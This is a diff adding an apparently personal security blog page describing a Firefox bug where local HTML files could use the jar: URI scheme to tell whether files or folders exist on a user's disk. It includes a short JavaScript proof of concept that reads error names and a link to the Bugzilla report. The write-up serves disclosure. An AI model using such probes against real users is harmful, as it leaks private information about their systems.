@@ -1,0 +1,66 @@
+<!doctype html>
+<html>
+<head>
+	<title>FireFox Check If Local File/Folder Exists Using Jar URI Scheme - Abdulrahman Al-Qabandi</title>
+	<link href="../q.css" rel="stylesheet">
+	
+
+</head>
+<body>
+<div id="qLogo"><img src="../q.png"/>
+<div id="qNav">
+<a href="../">Home</a>
+<a href="../About">About</a>
+<a href="../Tools">Tools</a>
+<a href="../Links">Links</a>
+<a href="https://www.twitter.com/qab" target="_BLANK">Twitter</a>
+<a href="../Stuff">Stuff</a>
+
+</div>
+</div>
+
+
+
+<div id="qWriteup">
+<h1>FireFox Check If Local File/Folder Exists Using Jar URI Scheme</h1>
+<br>
+
+<p>
+This bug only works on local HTML files (in other words using File:// URI scheme)<br>
+There was an update on FireFox disabling JAR files remotely, but this is not the case for local documents. You can still open and reference a JAR file iff you do it from a local file, which gave me some time to test it.<br>
+This was a pretty simple bug but with some potential for harm, you essentially could check if certain files or folders existed anywhere in the victims local disk, but you could not read them.<br>
+I think the original PoC speaks for itself.
+<br>
+
+
+
+<h2>Original PoC code:</h2>
+<!-- HTML generated using hilite.me --><div class="qCode" style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%">Within an HTML file: that contains an iframe with the id &#39;qab&#39;
+execute:
+try{qab.contentWindow.location=&#39;jar:file:///C:/does-not-exist/#!/&#39;}catch(e){console.dir(e.name)};//returns &#39;NS_ERROR_FILE_NOT_FOUND&#39;
+
+try{qab.contentWindow.location=&#39;jar:file:///C:/Temp/#!/&#39;}catch(e){console.dir(e.name)};//returns &#39;NS_ERROR_FILE_ACCESS_DENIED&#39;
+
+We can safely infer that the folder &#39;does-not-exist&#39; doesn&#39;t and &#39;Temp&#39; does. We can do the same with files. 
+</pre></div>
+
+
+</p><br>
+
+
+
+<p>
+<h2>References:</h2>
+<b>The Bugzilla report:</b> <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1247968" target="_blank">https://bugzilla.mozilla.org/show_bug.cgi?id=1247968</a><br>
+<b>jar protocol support has been disabled by default: </b><a href="https://www.fxsitecompat.com/en-CA/docs/2015/jar-protocol-support-has-been-disabled-by-default/">https://www.fxsitecompat.com/en-CA/docs/2015/jar-protocol-support-has-been-disabled-by-default/</a>
+<br>
+
+</p>
+</div>
+
+	<script type="application/javascript" src="../q.js">
+
+	
+	</script>
+</body>
+</html>
